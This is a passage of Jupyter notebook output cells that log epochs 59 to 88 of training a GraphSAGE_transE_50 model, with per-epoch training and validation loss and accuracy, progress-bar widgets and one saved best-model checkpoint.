     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:52:42 | INFO | Validation Loss: 0.6792 | Validation Accuracy: 0.8182\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "474e6851ea33480387a9453daeb0486c",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:52:56 | INFO | Epoch 59 | Train Loss: 0.6057 | Train Accuracy: 0.8646\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "440b4909c0544c63ae63f530ca02e522",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:52:57 | INFO | Validation Loss: 0.7804 | Validation Accuracy: 0.8129\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "c915d0bb503a456a81684b621463c209",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:53:13 | INFO | Epoch 60 | Train Loss: 0.6070 | Train Accuracy: 0.8656\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "f23ca89e0b084637ae8a791a27ad2aee",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:53:15 | INFO | Validation Loss: 0.5975 | Validation Accuracy: 0.8483\n",
      "\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Best Model Found!!  ./model/GraphSAGE_transE_50/epoch_60_loss_0.5975_acc_0.8483\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "350097f8f0ff48d38bd104b3a826251b",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:53:28 | INFO | Epoch 61 | Train Loss: 0.6169 | Train Accuracy: 0.8632\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "8619ac61fc8d413db8515ba2cc45f1ea",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:53:30 | INFO | Validation Loss: 0.6633 | Validation Accuracy: 0.8182\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "79eec5dc30784fc385de93a5c4776494",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:53:44 | INFO | Epoch 62 | Train Loss: 0.6250 | Train Accuracy: 0.8585\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "b4c48ede5eaf4d64b4ab3a5f9250d2f5",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:53:45 | INFO | Validation Loss: 0.6563 | Validation Accuracy: 0.8350\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "63d88b0e3ec9424193103fd30ce23d77",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:53:59 | INFO | Epoch 63 | Train Loss: 0.6214 | Train Accuracy: 0.8594\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "a4477f5ff4ad4274ba12c9b255538819",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:54:01 | INFO | Validation Loss: 0.7399 | Validation Accuracy: 0.8088\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "c5d653c8066442c5aa811e5d7b973415",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:54:15 | INFO | Epoch 64 | Train Loss: 0.6205 | Train Accuracy: 0.8625\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "4e98cddf3dc64f438ad2dd7a72e67cd5",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:54:16 | INFO | Validation Loss: 0.7313 | Validation Accuracy: 0.8169\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "7eda56d94138436199eac7cc12b2c66f",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:54:31 | INFO | Epoch 65 | Train Loss: 0.6052 | Train Accuracy: 0.8650\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "46b04abd7f0b45c1b5952c666331d2c0",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:54:32 | INFO | Validation Loss: 0.6608 | Validation Accuracy: 0.8350\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "658f49f970de4e00ba466fb55855b5cc",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:54:46 | INFO | Epoch 66 | Train Loss: 0.6396 | Train Accuracy: 0.8567\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "82d2d67996f3445e9453e3426d0add00",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:54:48 | INFO | Validation Loss: 0.7189 | Validation Accuracy: 0.7881\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "d7b6f70eae5049e08e372884faf82eed",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:55:01 | INFO | Epoch 67 | Train Loss: 0.6290 | Train Accuracy: 0.8608\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "ce4125ab568d43a8bccf2522f2a90e05",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:55:03 | INFO | Validation Loss: 0.6811 | Validation Accuracy: 0.8390\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "14c8b3f8a9394b8bb5e763a2f4c389ad",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:55:15 | INFO | Epoch 68 | Train Loss: 0.6176 | Train Accuracy: 0.8605\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "f9cbd787f31e4920bfa4bf260fc4856e",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:55:16 | INFO | Validation Loss: 0.6735 | Validation Accuracy: 0.8440\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "6d847fbb5bb244f19b4f86749d59568e",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:55:34 | INFO | Epoch 69 | Train Loss: 0.6241 | Train Accuracy: 0.8596\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "f2df16c5ab584272b1d419f830bc13a6",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:55:35 | INFO | Validation Loss: 0.7175 | Validation Accuracy: 0.7852\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "12a234d3426046ff9030f33586c77086",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:55:47 | INFO | Epoch 70 | Train Loss: 0.6140 | Train Accuracy: 0.8629\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "d974ebbc830f4bb3ae24df6767088ee4",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:55:48 | INFO | Validation Loss: 0.7368 | Validation Accuracy: 0.7986\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "af8bfab02a8d43d9aea726603d4d5dd4",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:56:00 | INFO | Epoch 71 | Train Loss: 0.5968 | Train Accuracy: 0.8643\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "99a8ef7ee7874ff2b3fb0cfa4b938c68",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:56:01 | INFO | Validation Loss: 0.7081 | Validation Accuracy: 0.8092\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "720c3e1031454aec9c4ff683b865beea",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:56:16 | INFO | Epoch 72 | Train Loss: 0.6049 | Train Accuracy: 0.8640\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "dbaed56945fb40e79ba221e4744ddb0a",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:56:17 | INFO | Validation Loss: 0.7111 | Validation Accuracy: 0.8253\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "1c6d37966cec42aa9911af28773f13fa",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:56:32 | INFO | Epoch 73 | Train Loss: 0.6679 | Train Accuracy: 0.8493\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "82530ed9b8c94877913b07a34260dd3f",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:56:34 | INFO | Validation Loss: 0.6893 | Validation Accuracy: 0.8175\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "c4a9f0a2cc8d4eb48af4de108f2d57a1",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:56:48 | INFO | Epoch 74 | Train Loss: 0.6025 | Train Accuracy: 0.8663\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "7c468cb1d6f541bf8fc99358f179eb7a",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:56:49 | INFO | Validation Loss: 0.7522 | Validation Accuracy: 0.8104\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "3971914d3be741d0b92bb9ee76ec1d3d",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:57:04 | INFO | Epoch 75 | Train Loss: 0.5912 | Train Accuracy: 0.8692\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "04521d923db94d728dc9ac74e47de120",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:57:06 | INFO | Validation Loss: 0.7483 | Validation Accuracy: 0.8114\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "0a90dc9a1d404e52b49af486bd581dc4",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:57:20 | INFO | Epoch 76 | Train Loss: 0.6025 | Train Accuracy: 0.8634\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "9f923546dc4d4416b1bbaf012223de0c",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:57:21 | INFO | Validation Loss: 0.6593 | Validation Accuracy: 0.8259\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "32b7af3553144f0da67101459d7bb945",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:57:37 | INFO | Epoch 77 | Train Loss: 0.5820 | Train Accuracy: 0.8760\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "f9f27b5a4745422d880a3f9e51345c24",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:57:38 | INFO | Validation Loss: 0.7430 | Validation Accuracy: 0.7975\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "e67fb6b28cdb4cb3b05e60c5caff9e2e",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:57:53 | INFO | Epoch 78 | Train Loss: 0.5860 | Train Accuracy: 0.8728\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "e6953c19d7d8421e90efe2c0de305075",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:57:54 | INFO | Validation Loss: 0.7085 | Validation Accuracy: 0.8140\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "43dbd6a1c9f243fc9ad07ae53f6adb9e",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:58:09 | INFO | Epoch 79 | Train Loss: 0.6061 | Train Accuracy: 0.8647\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "7cebb61fe04b4c0fafad6fc62f9b3f2a",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:58:11 | INFO | Validation Loss: 0.7986 | Validation Accuracy: 0.7942\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "7a03f6cba0d049ff8fdcf40962d141d7",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:58:25 | INFO | Epoch 80 | Train Loss: 0.5783 | Train Accuracy: 0.8724\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "520dd2a09c834987ba70379f7b7ad733",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:58:27 | INFO | Validation Loss: 0.6770 | Validation Accuracy: 0.8138\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "22934a2ceffa42d68e0669af19da79cf",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:58:39 | INFO | Epoch 81 | Train Loss: 0.5884 | Train Accuracy: 0.8670\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "eed1f7ee2fe3447f97d7c0d35cc6554a",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:58:41 | INFO | Validation Loss: 0.6852 | Validation Accuracy: 0.8111\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "d333188ac66a4d43b75035cca016ad47",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:58:54 | INFO | Epoch 82 | Train Loss: 0.5507 | Train Accuracy: 0.8775\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "c8361de2e67642e59314dcf130013de9",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:58:56 | INFO | Validation Loss: 0.7963 | Validation Accuracy: 0.7968\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "6d984d4bcadb41d4b4ec5b0605013848",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:59:09 | INFO | Epoch 83 | Train Loss: 0.5612 | Train Accuracy: 0.8790\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "48a1f410ba9a4a33ae50ecd9cd9f423d",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:59:11 | INFO | Validation Loss: 0.6547 | Validation Accuracy: 0.8266\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "92906fc6736143d3a5149ea7cbb3750c",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:59:23 | INFO | Epoch 84 | Train Loss: 0.5675 | Train Accuracy: 0.8782\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "936598c0f9d042a78266f0ffc334b88b",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:59:24 | INFO | Validation Loss: 0.6739 | Validation Accuracy: 0.8189\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "21b57b41b1a94f86ab455c9cc673c54b",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:59:37 | INFO | Epoch 85 | Train Loss: 0.5928 | Train Accuracy: 0.8649\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "04ba5ebf87eb4b50982850c2cae7acdb",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:59:38 | INFO | Validation Loss: 0.7902 | Validation Accuracy: 0.8000\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "f8851f711a4e4a6485505d9979db2f81",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:59:50 | INFO | Epoch 86 | Train Loss: 0.5545 | Train Accuracy: 0.8790\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "ed158ebaaa1749f09e0ba07e793ca334",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:59:51 | INFO | Validation Loss: 0.7405 | Validation Accuracy: 0.8161\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "38c1b8a20c164944a856a01f0594502c",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:00:03 | INFO | Epoch 87 | Train Loss: 0.5807 | Train Accuracy: 0.8737\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "c2f89913563a452480165190872162c3",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:00:04 | INFO | Validation Loss: 0.8765 | Validation Accuracy: 0.7749\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "dd7718fc071040dea6bd4765d4a70c81",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:00:17 | INFO | Epoch 88 | Train Loss: 0.5535 | Train Accuracy: 0.8821\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "c694155305ea4f5a8fb3fe88a889679d",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
